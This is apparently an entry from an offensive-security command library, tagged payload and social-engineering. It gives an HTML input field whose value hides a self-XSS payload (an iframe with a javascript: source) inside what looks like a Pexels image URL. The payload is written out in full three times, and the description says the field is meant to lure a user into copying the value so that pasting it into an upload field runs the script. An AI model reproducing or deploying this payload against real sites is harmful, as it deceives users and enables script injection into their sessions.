---
id: cmd-red-text-display
data: >-
  <input type="text" name=""
  value="https://images.pexels.com/photos/1108099/pexels-photo-1108099.jpeg?<<iframe/src=javascript:self.innerHTML=parent.name>img/src=x>">
tags:
  - payload
  - social-engineering
type: command
output: null
executor: html
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:06.838Z'
verified: false
validated: true
submitted: true
---
# red-text-payload-display

## Command

```html
<input type="text" name="" value="https://images.pexels.com/photos/1108099/pexels-photo-1108099.jpeg?<<iframe/src=javascript:self.innerHTML=parent.name>img/src=x>">
```

## Description

Input field with red text containing the self-XSS payload disguised as an image URL for user to copy.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| value | Image URL concatenated with payload | Yes |

## Examples

### Basic Usage

```html
<input type="text" name="" value="https://images.pexels.com/photos/1108099/pexels-photo-1108099.jpeg?<<iframe/src=javascript:self.innerHTML=parent.name>img/src=x>">
```

## Expected Output

User copies this value, which triggers XSS on paste in upload field.

## Related

- [[procedures/Guide-User-Interaction-for-Payload-Delivery]]
